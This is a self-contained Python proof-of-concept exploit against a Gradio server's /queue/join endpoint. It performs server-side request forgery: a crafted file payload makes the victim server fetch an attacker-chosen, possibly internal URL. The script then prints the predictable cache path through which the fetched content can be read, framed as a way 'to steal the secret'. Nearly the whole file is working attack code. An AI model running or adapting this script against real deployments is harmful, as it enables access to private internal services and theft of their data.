# /// script
# requires-python = ">=3.12"
# dependencies = [
#     "requests",
# ]
# ///
import requests
import sys
import hashlib
from pathlib import Path

DEFAULT_PORT = 7860     # Gradio default port
VULN_ENDPOINT = "/queue/join?"  # The vulnerable /queue/join endpoint we'll target

if len(sys.argv) < 2 or len(sys.argv) > 3:
    print(f"Usage: python {sys.argv[0]} <attacker_requested_http_url> [<victim_gradio_server>]")
    print(f"\te.g.: python3 {sys.argv[0]} http://google.com http://localhost:{DEFAULT_PORT}")
    print(f"\te.g.: python3 {sys.argv[0]} http://localhost:8000 http://localhost:{DEFAULT_PORT}")  # Imagine 8000 is a private internal server
    sys.exit(1)

attacker_url = sys.argv[1]  # Attacker-chosen URL, potentially something "internal" that only server can reach
if len(sys.argv) == 2:
    gr_server = f"http://localhost:{DEFAULT_PORT}"    # In a real setting, IP address and port may be anything
elif len(sys.argv) == 3:
    gr_server = sys.argv[2]
else:
    raise ValueError("IMPOSSIBLE.")
gr_server_target = gr_server + VULN_ENDPOINT

headers = {"content-type": "application/json"}

data = {
    "data": [
        [
            {
                "path": attacker_url,   # Attacker-chosen URL will be POSTed to the /queue/join, triggering async_save_url_to_cache() to cache the result on the server
                "url": "http://127.0.0.1:7860/file=/tmp/gradio/d29f53f2aa166f690d19ef61eeb6624869eee0c0e0e7c99193ee91d8fa39d47c/256x256.png", # doesn't matter
                "orig_name": "256x256.png",
                "size": 65094,
                "mime_type": "image/png",
                "meta": {"_type": "gradio.FileData"}
            }
        ]
    ],
    "event_data": None,
    "fn_index": 0,
    "trigger_id": 2,
    "session_hash": "0" # also doesn't matter
}

response = requests.post(gr_server_target, headers=headers, json=data)

sha256 = hashlib.sha256()
sha256.update(attacker_url.encode("utf-8"))     # We can predict the precise path of the cached result on the server!
print(f"file in {gr_server}/file=/tmp/gradio/{sha256.hexdigest()}/{Path(attacker_url).name.replace(':', '')}")  # NOTE: This depends on the server giving us filesystem access through URL...
print("ctrl+click that link above ^ to steal the secret!")
